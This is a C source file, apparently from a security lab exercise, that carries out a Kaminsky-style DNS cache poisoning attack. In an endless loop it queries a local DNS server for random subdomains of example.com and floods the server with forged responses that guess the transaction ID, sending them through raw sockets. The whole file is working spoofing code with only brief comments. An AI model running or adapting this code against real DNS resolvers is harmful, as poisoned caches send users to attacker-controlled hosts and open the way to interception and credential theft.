#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader
{
  unsigned char iph_ihl : 4, iph_ver : 4;
  unsigned char iph_tos;
  unsigned short int iph_len;
  unsigned short int iph_ident;
  unsigned short int iph_flag : 3, iph_offset : 13;
  unsigned char iph_ttl;
  unsigned char iph_protocol;
  unsigned short int iph_chksum;
  struct in_addr iph_sourceip;
  struct in_addr iph_destip;
};

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(char *buffer, int pkt_size, char *name);
void send_dns_response(char *buffer, int pkt_size, char *name);

int main()
{
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE *f_req = fopen("ip_req.bin", "rb");
  if (!f_req)
  {
    perror("Can't open 'ip_req.bin'");
    exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE *f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp)
  {
    perror("Can't open 'ip_resp.bin'");
    exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
  size_t tries = 0;
  char a[26] = "abcdefghijklmnopqrstuvwxyz";
  size_t times = 0;
  while (1)
  {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k = 0; k < 5; k++)
      name[k] = a[rand() % 26];

    /* Step 1. Send a DNS request to the targeted local DNS server.
                   This will trigger the DNS server to send out DNS queries */
    printf("Try: %ld, Trying %s.example.com\n", tries, name);
    tries++;
    send_dns_request(ip_req, n_req, name);

    /* Step 2. Send many spoofed responses to the targeted local DNS server,
                   each one with a different transaction ID. */
    for (int i = 0; i < 200; i++)
    {
      // Send 100 spoofed responses to 10.9.0.153
      send_dns_response(ip_resp, n_resp, name);
    }
  }
  fclose(f_req);
  fclose(f_resp);
  return 0;
}

void send_dns_request(char *buffer, int pkt_size, char *name)
{
  // Modify the name in the request (change 5 bytes starting from offset 41 in the header)
  memcpy(buffer + 41, name, 5);

  // Send the packet
  send_raw_packet(buffer, pkt_size);
}

void send_dns_response(char *buffer, int pkt_size, char *name)
{
  // Modify the name in the request (change 5 bytes starting from offset 41 in the header)
  memcpy(buffer + 41, name, 5);

  // Modify the name in the answer (change 5 bytes starting from offset 64 in the header)
  memcpy(buffer + 64, name, 5);

  // Modify the transaction ID (offset 28)
  unsigned short id = rand() & 0xFFFF;  // random 16-bit integer - the transaction ID
  unsigned short id_net_order = htons(id);
  memcpy(buffer + 28, &id_net_order, 2);  // Assign the transaction ID to the packet

  // Send the packet
  send_raw_packet(buffer, pkt_size);
}

void send_raw_packet(char *buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0)
  {
    perror("Socket creation failed");
    exit(1);
  }

  // Step 2: Set socket option.
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0)
  {
    perror("Socket option failed");
    exit(1);
  }

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *)buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}